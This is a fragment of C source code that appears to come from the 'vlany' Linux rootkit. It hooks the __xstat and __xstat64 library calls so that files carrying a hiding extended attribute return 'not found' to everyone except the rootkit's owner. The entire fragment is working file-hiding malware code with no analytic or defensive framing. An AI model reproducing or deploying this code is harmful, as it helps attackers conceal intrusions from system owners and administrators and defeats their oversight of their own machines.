int __xstat(int version, const char *pathname, struct stat *buf)
{
    #ifdef DEBUG
        printf("[vlany] __xstat() called\n");
    #endif

    HOOK(old_xstat, C__XSTAT);

    if(owned()) return old_xstat(version, pathname, buf);

    if(hidden_xattr(pathname)) { errno = ENOENT; return -1; }

    return old_xstat(version, pathname, buf);
}

int __xstat64(int version, const char *pathname, struct stat64 *buf)
{
    #ifdef DEBUG
        printf("[vlany] __xstat64() called\n");
    #endif

    HOOK(old_xstat64, C__XSTAT64);

    if(owned()) return old_xstat64(version, pathname, buf);

    if(hidden_xattr(pathname)) { errno = ENOENT; return -1; }

    return old_xstat64(version, pathname, buf);
}
